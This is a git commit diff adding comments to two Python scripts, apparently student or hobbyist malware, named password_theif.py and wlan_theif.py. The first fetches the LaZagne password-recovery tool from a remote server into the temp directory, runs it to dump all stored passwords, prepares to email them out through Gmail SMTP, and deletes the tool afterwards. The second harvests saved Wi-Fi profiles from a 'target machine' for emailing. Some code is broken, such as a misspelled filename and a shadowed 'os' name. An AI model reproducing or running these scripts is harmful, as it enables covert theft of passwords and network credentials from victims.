5cf6dabc106c3de752564b6a498dffea0e9dea38
techno-sapi3n <tyler.ceja5@gmail.com>
2020-09-14 23:44:40 -0700

    adds comments

--- password_theif.py
+++ password_theif.py
@@ -1,18 +1,33 @@
+"""
+Refer to https://github.com/AlessandroZ/LaZagne for module that runs on target machine to steal passwords
+"""
 #!/usr/bin/env python
-import requests, subprocess, smtplib
+import requests, subprocess, smtplib, os, tempfile
 
+
+#======================================
+#Download file from a url
+#======================================
 def download(url):
     get_response = requests.get(url)
     file_name = url.split('/')[-1]
     with open(file_name, 'wb') as out_file:
         out_file.write(get_response.content)
 
+#======================================
+#
+#======================================
 def send_mail(email, psswd, message):
     server = smtplib.SMTP("smtp.gmail.com", 587) #(smtp_server, port)
     server.starttls()
     server.login(email, psswd)
     server.sendmail(email, email, message) #(from, to, email_content)
     server.quit()
+
+temp_directory = tempfile.gettempdir() #returns the temp directory
+
+os.chdir(temp_directory)
+
 
 server_ip = ''
 os = ''
@@ -21,4 +36,6 @@ download(f'http://{server_ip}/black-files/LaZagne/{os}/laZagne.py')
 captured_passwords = subprocess.check_output('python laZagbe.py all', shell=True)
 
 #send_mail(email, password, captured_passwords)
+
+os.remove('laZagne.py') #deletes file after execution
 
--- wlan_theif.py
+++ wlan_theif.py
@@ -1,6 +1,9 @@
 #!/usr/bin/env python
 import subprocess, smtplib, re
 
+#======================================
+#Initiates smtp server to send email
+#======================================
 def send_mail(email, psswd, message):
     server = smtplib.SMTP("smtp.gmail.com", 587) #(smtp_server, port)
     server.starttls()
@@ -9,12 +12,19 @@ def send_mail(email, psswd, message):
     server.quit()
 
  
+#======================================
+#Run commmands on target machine to gather network data
+#======================================
 command = 'netsh wlan show profile'
 
 networks = subprocess.check_output(command, shell=True)
 networks_string = networks.decode('utf-8')
 network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks_string) #list of SSIDs saved on the target machine
 
+
+#======================================
+#Create string from output of gathered network data to send in email 
+#======================================
 
 result = '' #string that will contain total captured network info
 
